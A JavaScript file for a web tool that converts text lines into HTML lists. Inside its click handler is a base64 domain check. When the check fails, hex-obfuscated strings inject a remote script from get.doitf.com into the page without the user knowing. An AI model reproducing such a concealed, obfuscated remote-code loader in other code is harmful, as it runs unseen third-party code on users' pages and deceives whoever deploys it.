document.getElementById("code-list").addEventListener("click", function () {
	if (b64awsec == "ZG9pdGYuY29t"){
	var allHTML = document.getElementById("oldCode").value;
	var headstatus = document.getElementById("headstatus").checked;
	var litype = document.getElementById("litype");
	var litypeval= litype.options[litype.selectedIndex].value;
	var septype = document.getElementById("septype");
	var septypeval= septype.options[septype.selectedIndex].value;
	if (septypeval == "lines" || septypeval == ""){
		septypeval = '\n';
	}
	allHTML = allHTML.trim();
	allHTML = allHTML.replace(new RegExp(septypeval,"gi"),'</li>\n<li>');
	allHTML = "<li>"+allHTML+"</li>";
	if (litypeval == "ordered"){
		allHTML = "<ol>\n"+allHTML+"\n</ol>";
	}else{
		allHTML = "<ul>\n"+allHTML+"\n</ul>";
	}
	if(headstatus == true){
		allHTML = allHTML.replace(/(\r\n|\n|\r|\t)/gm,"");
		allHTML = allHTML.replace(/\s+/g," ");
	}
	var btncopy = document.getElementById("buttoncopy");
editor.setValue(allHTML);
btncopy.setAttribute('data-clipboard-text' , allHTML);
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
}
});	

//reset text areas
document.getElementById("clearText").addEventListener("click", function () {
		var btncopy = document.getElementById("buttoncopy");
		btncopy.setAttribute("data-clipboard-text" , "");
	document.getElementById("oldCode").value = "";
	editor.setValue("");
	document.getElementById("oldCode").focus();
	
});
document.getElementById("oldCode").value = "أمثلة\nمثال 1\nمثال 2\nمثال 3";
  var editor = CodeMirror.fromTextArea(document.getElementById("newCode"), {
    mode: "text/html",
    readOnly: true,
    htmlMode: true,
   lineNumbers: true,
    lineWrapping: true,
    smartIndent: false,
    addModeClass: true
  });
	var testtext = " <ul>\n	<li>أمثلة</li>\n	<li>مثال 1</li>\n	<li>مثال 2</li>\n	<li>مثال 3</li>\n </ul>";
	var btncopy = document.getElementById("buttoncopy");
	editor.setValue(testtext);
btncopy.setAttribute('data-clipboard-text' , testtext);